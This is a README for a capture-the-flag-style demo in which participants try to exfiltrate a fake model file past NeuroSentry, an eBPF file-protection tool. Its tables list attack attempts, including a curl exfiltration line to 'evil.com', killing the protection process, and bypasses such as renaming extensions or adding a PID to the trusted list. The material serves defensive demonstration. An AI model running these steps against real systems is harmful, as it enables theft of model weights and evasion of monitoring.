# Capture The Model

**Interactive Demo Environment**

## Overview

Capture The Model is a hands-on demo environment that demonstrates NeuroSentry's protection capabilities. Participants attempt to exfiltrate a "protected" AI model from a containerized inference environment while NeuroSentry actively monitors and blocks unauthorized access.

## Challenge Setup

### Quick Start (Recommended)

```bash
cd demos/capture-the-model
sudo ./start.sh
```

This will:
1. Build the NeuroSentry Docker image
2. Generate a fake 13GB model file
3. Start all services (NeuroSentry, attacker container, scoring server)
4. Print access instructions

The challenge includes:
- **NeuroSentry** container (protected mode)
- **Attacker** container (your workspace)
- **Scoring server** (tracks attempts and verifies success)
- **Prometheus** (metrics)
- **Grafana** (dashboard at http://localhost:3000)

### Manual Setup

```bash
# 1. Create protected model
mkdir -p /opt/capture-the-model/model
dd if=/dev/urandom of=/opt/capture-the-model/model/llama-2-7b.safetensors bs=1M count=13312

# 2. Deploy NeuroSentry
docker run -d --name neurosentry \
  --privileged --pid=host --network=host \
  -v /sys/kernel/debug:/sys/kernel/debug \
  -v /opt/capture-the-model/model:/models \
  neurosentry:latest

# 3. Create attacker container
docker run -d --name attacker \
  --privileged --network=host \
  -v /opt/capture-the-model/model:/target:ro \
  alpine:3.19 sleep infinity
```

## Challenge Details

### Objective

Copy the protected model file (`/target/model.safetensors`) to `/tmp/stolen/` and verify integrity.

### Constraints

- **Time Limit**: 15 minutes
- **Environment**: Isolated Linux container
- **Protection**: NeuroSentry in enforce mode
- **File Size**: 13GB

### What Participants Should Know

NeuroSentry is protecting the model with:
1. **LSM Hooks**: Block file operations at VFS layer (ENFORCE MODE)
2. **XDP/TC Programs**: Monitor network traffic (MONITOR MODE - logs but doesn't block)
3. **Uprobes**: Monitor PyTorch model loading

### Protection Levels

```
Layer 1: File Access Control (LSM file_open) - ENFORCED
         Blocks read access to protected file extensions (.safetensors, .gguf, .pth, etc.)
         Returns -EPERM to untrusted processes

Layer 2: Network Monitoring (XDP/TC) - MONITORED ONLY
         Logs all egress traffic but does not block
         (Blocking disabled to prevent breaking legitimate network operations)

Layer 3: Process Monitoring (Trusted PID tracking)
         Only whitelisted PIDs can access protected files
```

**Note**: Network blocking is intentionally disabled because aggressive network filtering
can break legitimate operations and cause connectivity issues. In production, use
network segmentation and firewalls for network-level protection.

## Expected Participant Attempts

### Common Techniques

| Attempt | Expected Result | Explanation |
|---------|-----------------|-------------|
| `cp /target/model.safetensors /tmp/` | **EPERM** | LSM file_open blocks .safetensors files |
| `cat /target/model.safetensors > /tmp/` | **EPERM** | LSM file_open blocks .safetensors files |
| `dd if=/target/model...` | **EPERM** | LSM file_open blocks .safetensors files |
| `python3 -c "open('/target/model.safetensors')"` | **EPERM** | LSM blocks all untrusted processes |
| `kill -9 $(pidof neurosentry)` | Auto-restart | Systemd monitoring |
| `docker rm -f neurosentry` | Auto-restart | Systemd monitoring |
| `curl http://evil.com --data-binary @file` | **Monitored** | Network traffic is logged, not blocked |
| Send via UDP | **Monitored** | Network traffic is logged, not blocked |

**Important**: Network exfiltration is MONITORED but NOT BLOCKED. In a real deployment,
combine NeuroSentry with network-level controls (firewalls, segmentation) for full protection.

### Advanced Techniques (Challenge Difficulty)

| Attempt | Expected Result | Notes |
|---------|-----------------|-------|
| Kernel exploit | Success/Fail | Depends on kernel version, very difficult |
| Container escape | Success/Fail | Depends on container config |
| BPF map tampering | Audited | All map changes are logged with security audit |
| Add own PID to trusted list | Audited | Requires root, logged with "SECURITY:" prefix |
| Rename file extension | Success | Files are checked by extension only |
| Symlink to bypass | Blocked | LSM hook checks final path |

### Known Limitations (For Educational Discussion)

- **Extension-based detection**: Files are protected by extension (.safetensors, .gguf, etc.)
  Renaming the file removes protection (real deployments use content-based detection)
- **PID-based trust**: If attacker can modify trusted_pids map, protection is bypassed
  (requires CAP_BPF or root access)
- **Network is monitor-only**: Exfiltration via network will be logged but not blocked

## Scoring System

The challenge includes an automated scoring system that tracks:
- Number of attempts per participant
- Methods used (copy, network, memory dump, etc.)
- Time elapsed
- Success verification (MD5 hash matching)

### Scoring API

```bash
# Get current status
curl http://localhost:8080/status

# Submit an attempt
curl -X POST http://localhost:8080/submit \
  -H "Content-Type: application/json" \
  -d '{"method": "cp", "success": false, "details": "EPERM"}'

# Verify exfiltration
curl -X POST http://localhost:8080/verify \
  -H "Content-Type: application/json" \
  -d '{"file_path": "/tmp/stolen/model.safetensors"}'

# View leaderboard
curl http://localhost:8080/leaderboard

# View all attempts
curl http://localhost:8080/attempts
```

### Achievement Categories

Participants can earn different achievements based on their performance:

| Achievement | Criteria |
|-------------|----------|
| **Attacker** | Successfully exfiltrate the model |
| **Explorer** | 10+ creative attempts documented |
| **Researcher** | Find a novel bypass technique |
| **Auditor** | Find a critical security bug (CVE candidate) |

## Organizer Notes

### Pre-Flight Checklist

- [ ] Isolated test machine (no production access)
- [ ] Model file is random data (no real IP)
- [ ] Network containment verified
- [ ] Rollback plan ready
- [ ] Emergency stop procedure tested

### Emergency Stop

```bash
# Stop everything immediately
docker stop attacker neurosentry
rmmod bpf_test_mod  # If loaded
rm -rf /opt/capture-the-model
```

### Troubleshooting

**Issue**: Participants can't even see the file
**Fix**: Check bind mount permissions

**Issue**: NeuroSentry crashes
**Fix**: Check kernel logs: `dmesg | tail -50`

**Issue**: Network not blocking
**Fix**: Verify XDP attachment: `bpftool net`

## Post-Challenge

### Data Collection

- All attempts logged to `/var/log/neurosentry/attempts.log`
- Metrics available at `http://localhost:2112/metrics`
- Screen recordings encouraged

### Debrief

After the challenge, explain:
1. Which techniques were expected to fail (and why)
2. Which techniques succeeded (if any)
3. How NeuroSentry works under the hood
4. Real-world deployment considerations

## Contact

- **Issues**: https://github.com/tonghuaroot/neurosentry/issues
- **Discussions**: https://github.com/tonghuaroot/neurosentry/discussions

## License

This challenge is part of NeuroSentry, Apache 2.0 licensed.
